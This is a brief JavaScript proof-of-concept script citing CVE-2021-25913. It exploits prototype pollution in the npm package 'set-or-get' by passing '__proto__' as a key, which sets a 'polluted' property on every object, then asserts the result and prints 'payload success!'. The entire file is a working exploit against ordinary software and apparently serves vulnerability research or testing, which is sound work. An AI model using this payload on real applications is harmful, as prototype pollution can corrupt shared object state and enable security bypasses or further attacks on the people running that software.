//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25913

const assert = require('assert');
var SetOrGet = require("set-or-get");
var obj = {}
console.log("Before : " + obj.polluted);
SetOrGet(obj, "__proto__", {}).polluted ="yes";

console.log("After : " + obj.polluted);
assert({}.polluted === "yes")
console.log("payload success!");